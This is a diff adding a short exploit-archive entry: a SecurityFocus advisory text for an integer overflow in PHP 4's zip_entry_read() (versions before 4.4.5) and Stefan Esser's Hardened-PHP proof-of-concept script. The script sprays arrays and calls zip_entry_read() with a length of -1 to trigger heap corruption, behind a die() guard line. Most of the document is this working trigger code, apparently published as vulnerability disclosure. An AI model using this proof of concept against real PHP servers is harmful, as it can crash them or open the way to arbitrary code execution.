@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/23169/info
+
+PHP is prone to an integer-overflow vulnerability because it fails to ensure that integer values aren't overrun. Attackers may exploit this issue to cause a heap-based buffer overflow.
+
+Exploiting this issue may allow attackers to execute arbitrary machine code in the context of the affected application. Failed exploit attempts will likely result in a denial-of-service condition.
+
+This issue affects versions prior to PHP 4.4.5.
+
+<?php
+  ////////////////////////////////////////////////////////////////////////
+  //  _  _                _                     _       ___  _  _  ___  //
+  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
+  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
+  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
+  //                                                                    //
+  //         Proof of concept code from the Hardened-PHP Project        //
+  //                   (C) Copyright 2007 Stefan Esser                  //
+  //                                                                    //
+  ////////////////////////////////////////////////////////////////////////
+  //        PHP 4 zip_entry_read() Integer Overflow Vulnerability       //
+  ////////////////////////////////////////////////////////////////////////
+
+  // This is meant as a protection against remote file inclusion.
+  die("REMOVE THIS LINE");
+
+  $r = zip_open("x.zip");
+  $e = zip_read($r);
+  $x = zip_entry_open($r, $e);
+
+
+  for ($i=0; $i<1000; $i++) $arr[$i]=array(array(""));
+  unset($arr[600]);
+  
+  zip_entry_read($e, -1);
+  
+  unset($arr[601]);
+?>
